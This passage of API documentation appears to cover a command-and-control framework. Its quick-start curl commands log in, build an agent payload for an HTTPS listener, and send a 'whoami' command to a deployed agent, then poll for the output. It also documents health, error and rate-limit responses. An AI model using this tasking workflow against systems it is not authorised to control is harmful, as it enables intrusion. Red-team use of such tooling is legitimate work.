data: {"event":"created","listener":{"name":"https-main","protocol":"HTTPS",...}}

event: heartbeat
data: {"timestamp":1698672000}
```

---

## Health

### GET /health

Health check endpoint. **No authentication required.**

```bash
curl -sk https://localhost:8443/health
```

**Response (200):**
```json
{
  "status": "healthy",
  "goroutines": 42,
  "memory_mb": 15,
  "sse_clients": 2,
  "grpc_connected": true,
  "ws_proxy_enabled": true,
  "ws_proxy_connected": true
}
```

---

## Quick Start

```bash
# 1. Login and extract token
TOKEN=$(curl -sk https://localhost:8443/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"YOUR_API_PASSWORD"}' \
  | jq -r '.access_token')

# 2. List agents
curl -sk https://localhost:8443/api/v1/agents \
  -H "Authorization: Bearer $TOKEN" | jq

# 3. Build a payload
curl -sk https://localhost:8443/api/v1/payloads/build \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"listener":"https-main","os":"linux","arch":"amd64"}' \
  -o agent && chmod +x agent

# 4. Send a command and poll for output
AGENT_ID="abc-123-def"
DB_ID=$(curl -sk https://localhost:8443/api/v1/agents/$AGENT_ID/commands \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami"}' | jq -r '.db_id')

sleep 5
curl -sk https://localhost:8443/api/v1/commands/$DB_ID \
  -H "Authorization: Bearer $TOKEN" | jq '.outputs'
```

---

## Error Responses

All errors return a consistent JSON format:

```json
{"error": "descriptive error message"}
```

| Code | Description |
|------|-------------|
| `200` | Success |
| `201` | Created |
| `202` | Accepted (queued for later delivery) |
| `400` | Bad Request — invalid input or validation failure |
| `401` | Unauthorized — missing/invalid/expired token |
| `403` | Forbidden — account inactive or certificate mismatch |
| `404` | Not Found — resource does not exist |
| `429` | Too Many Requests — rate limited |
| `500` | Internal Server Error |
| `503` | Service Unavailable — WebSocket proxy required but not configured |

---

## Rate Limiting

The API enforces per-IP rate limiting:

- **100 requests per minute** per IP address
- Exceeding returns `429` with:

```json
{
  "error": "rate limit exceeded",
  "retry_after": 60
}
```
